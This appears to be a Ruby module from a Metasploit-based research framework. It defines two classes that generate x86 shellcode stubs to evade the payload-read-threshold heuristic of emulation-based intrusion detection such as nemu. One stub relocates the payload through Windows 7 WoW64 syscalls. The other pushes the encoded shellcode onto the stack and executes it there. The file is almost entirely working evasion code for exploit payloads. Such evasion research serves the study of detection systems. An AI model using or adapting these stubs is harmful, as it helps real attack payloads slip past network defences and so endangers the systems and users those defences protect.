# -*- coding: binary -*-

# =============================================================
# Payload-Read Threshold (PRT) heuristic evasion armoring classes
#
# @Author: Jos Wetzels
# =============================================================

require 'ebnids/ebnids'
require 'ebnids/getpc'
require 'rex/poly'
require 'rex/arch'
require 'rex/text'

module Ebnids


  # Anti-heuristics class for evasion of PRT heuristic
  class PRT_Relocater < AntiHeuristicArmor

    def initialize
      super(
        'Name'             => 'PRT SYSCALL-based relocater',  
        'ID'               => 7,             
        'Description'      => 'Anti-PRT heuristic armor using SYSCALL-based code relocation',
        'Author'           => 'Jos Wetzels',   
        'License'          => MSF_LICENSE,   
        'Target'           => 'nemu',             
        'SizeIncrease'     => 0,         
        'isGetPC'          => 1,
        'hasEncoder'       => 0,
        'Conflicts'        => [],             
        'PreDeps'          => [],             
        'PostDeps'         => [])             
    end

    #
    # Lightly-polymorphic getPC stub to relocate payload to virtual memory using syscall to prevent triggering PRT heuristic (since we don't perform read instructions on payload body)
    #
    # [-] Limitations:
    #      - Currently only works on Windows 7 (WoW64)
    #
    # [*] Note:
    #      - This can be further improved by better polymorphism
    #      - This can be further improved by supporting more platforms
    #
    def getPCStub(getPCDestReg)

      badchars = @module_metadata['badchars']

      payloadSize = @module_metadata['enc'].bytesize

      allocateVirtualMemory = 0x0015
      readVirtualMemory = 0x003C

      page_readwrite_execute = 0x40
      mem_commit = 0x1000

      stub = ""

      gp_regs = Array[Rex::Arch::X86::EAX, Rex::Arch::X86::ECX, Rex::Arch::X86::EDX, Rex::Arch::X86::EBX, Rex::Arch::X86::ESI, Rex::Arch::X86::EDI]
      # reg1 != eax, ecx, edx (to prevent clobbering by syscall calling operation)
      gp_regs2 = gp_regs - Array[Rex::Arch::X86::EAX, Rex::Arch::X86::ECX, Rex::Arch::X86::EDX]

      # randomize
      gp_regs.shuffle
      gp_regs2.shuffle

      # randomize regs
      # cannot be eax, ecx, edx
      reg1 = gp_regs2[0]

      # cannot be eax, ecx, edx or reg1
      ptrReg = gp_regs2[1]

      # reg2, reg3 != reg1
      gp_regs = gp_regs - Array[gp_regs2[0]]
      reg2 = gp_regs[0]
      reg3 = gp_regs[1]

      # TODO: support other platforms as well (this is WoW64 specific stub)
      do_syscall_stub = Rex::Arch::X86.xor_reg(Rex::Arch::X86::ECX, Rex::Arch::X86::ECX) + 
                        "\x8D" + (0x44 + (8 * Rex::Arch::X86::EDX)).chr + "\x24\x04" + # LEA EDX, [ESP + 4]
                        Rex::Arch::X86.sub(-0xC0, ptrReg, badchars) + # ptrReg = 0xC0
                        "\x64\xFF" + (0x10 + ptrReg).chr + # CALL [ptrReg]
                        "\xC3" # RETN

      stub = Rex::Arch::X86.jmp_short(do_syscall_stub.bytesize) + do_syscall_stub

      # AllocateVirtualMemory()
      stub = stub + Rex::Arch::X86.sub(8, Rex::Arch::X86::ESP, badchars, false, true) + # reserve two DWORDs on stack
             Rex::Arch::X86.mov_reg(reg1, Rex::Arch::X86::ESP) + # save address
             Rex::Arch::X86.sub(-payloadSize, reg2, badchars) + # reg2 = payloadSize
             "\x89" + (0x00 + reg1 + (8 * reg2)).chr + # MOV [reg1], reg2
             Rex::Arch::X86.set(reg3, 0) + # reg3 = 0
             "\x89" + (0x40 + reg1 + (8 * reg3)).chr + "\x04" + # outbase = 0
             Rex::Arch::X86.sub(-page_readwrite_execute, reg3, badchars, false, true) + # reg3 = page_readwrite_execute
             Rex::Arch::X86.push_reg(reg3) + # push reg3

             Rex::Arch::X86.sub(-(mem_commit - page_readwrite_execute), reg3, badchars, false, true) + # reg3 = (mem_commit - page_readwrite_execute)
             Rex::Arch::X86.push_reg(reg3) + # push reg3
             Rex::Arch::X86.push_reg(reg1) + # push reg1 (region_size pointer)
             
             Rex::Arch::X86.set(reg3, 0) + # reg3 = 0
             Rex::Arch::X86.push_reg(reg3) + # push zeros

             Rex::Arch::X86.sub(-4, reg1, badchars, false, true) + # out base address
             Rex::Arch::X86.push_reg(reg1) +
             Rex::Arch::X86.push_dword(-1) + # process handle

             # TODO: support other windows versions as well (this is the windows 7 specific syscall number)
             Rex::Arch::X86.sub(-allocateVirtualMemory, Rex::Arch::X86::EAX, badchars) # AllocateVirtualMemory SYSCALL #

      stub = stub + Rex::Arch::X86.call(-(stub.bytesize + 3)) # call do_syscall

      # Re-randomize reg2 & reg3
      gp_regs.shuffle
      reg2 = gp_regs[0]
      reg3 = gp_regs[1]

      # ReadVirtualMemroy
      stub = stub + Rex::Arch::X86.push_reg(Rex::Arch::X86::EAX) +
             Rex::Arch::X86.sub(-payloadSize, reg2, badchars) + # reg2 = payloadSize
             Rex::Arch::X86.push_reg(reg2) + # size

             "\xFF" + (0x30 + reg1).chr + # dst
             Rex::Arch::X86.jmp_short(0x13) + # jmp callback (last instruction of getPC stub)
             # returnLabel
             Rex::Arch::X86.push_dword(-1) + # process handle

             # TODO: support other windows versions as well (this is the windows 7 specific syscall number)
             Rex::Arch::X86.sub(-readVirtualMemory, Rex::Arch::X86::EAX, badchars) # ReadVirtualMemory SYSCALL #

      stub = stub + Rex::Arch::X86.call(-(stub.bytesize + 3)) # call do_syscall

      # getPCDestReg = out_base= address of newly relocated payload
      stub = stub + "\x8B" + (0x00 + reg1 + (8 * getPCDestReg)).chr + # mov getPCDestReg, [reg1]
             # TODO: more alternatives (eg. ret, call, etc.)
             Rex::Arch::X86.jmp_reg(Rex::Arch::X86.reg_name32(getPCDestReg)) + # transfer execution flow to getPCDestReg (ie. relocated payload)
             # callback
             # TODO: avoid getPC seeding instruction here
             Rex::Arch::X86.call(-0x18) # call returnLabel

      return stub
    end

  end

  # Anti-heuristics class for evasion of PRT heuristic
  # Direct copy of GetPC_StackConstruct which was implemented to include PRT-evasion as well
  class PRT_StackConstruct < AntiHeuristicArmor

    def initialize
      super(
        'Name'             => 'PRT StackConstructor',  
        'ID'               => 8,             
        'Description'      => 'Anti-PRT heuristic armor using stack-constructed shellcode',
        'Author'           => 'Jos Wetzels',   
        'License'          => MSF_LICENSE,   
        'Target'           => 'nemu',             
        'SizeIncrease'     => 0,         
        'isGetPC'          => 1,
        'hasEncoder'       => 1,
        'Conflicts'        => [],             
        'PreDeps'          => [],             
        'PostDeps'         => [])             
    end

    def getPCStub(getPCDestReg)
      # Stand-in 'GetPC' code (since esp = PC when the code gets run)
      return Rex::Arch::X86.mov_reg(getPCDestReg, Rex::Arch::X86::ESP) +
             Rex::Arch::X86.sub(-5, getPCDestReg, @module_metadata['badchars'], false, true)
    end

    #
    # Custom encoding to push (encoded) shellcode to the stack and execute from there
    #
    # [-] Limitations:
    #      - Not polymorphic
    #      - Might be incompatible with some (rare) shellcodes presuming large amount of data can be written to preceding stack (due to overwriting issues)
    #
    # [*] Note:
    #      - This can be further improved by applying polymorphism
    #      - This can be further improved by letting caller specify desired amount of prepended stackspace
    #
    def encode(buf)
      badchars = @module_metadata['badchars']
      # Additional stackspace to take into account initial shellcode instructions assuming some stackspace to work with (eg. FNSTENV storing record on stack)
      stackSpaceCount = 28
      stackSpace = Rex::Text.rand_text(stackSpaceCount, badchars)

      # Prepend stackSpace to buf (which is getpc_stub + decoder_stub + encoded body)
      buf = stackSpace + buf

      # Align buf to DWORD size (for subsequent conversion to stack-pushed blocks)
      if (buf.length % 4 != 0)
        #TODO: report error if max_len is exceeded through padding?
        #if ((buf.length + (4 - (buf.length % 4))) > max_len)
        #  error
        #end
        buf = buf + Rex::Text.rand_text((4 - (buf.length % 4)), badchars)
      end

      # Chop buffer into blocks of 4 (we can use {4} since buf is DWORD-aligned)
      blocks = buf.scan(/.{4}/)

      # Push in reverse order to stack
      construction_stub = ""
      blocks.reverse.each { |x| construction_stub = construction_stub + "\x68" + x } # push(x)

      # Transfer control to (ESP + stackSpaceCount) after pushing is done
      construction_stub = construction_stub + 
                          Rex::Arch::X86.sub(-(stackSpaceCount), Rex::Arch::X86::ESP, badchars, false, true) +
                          Rex::Arch::X86.jmp_reg(Rex::Arch::X86.reg_name32(Rex::Arch::X86::ESP))

      return construction_stub
    end

  end

end
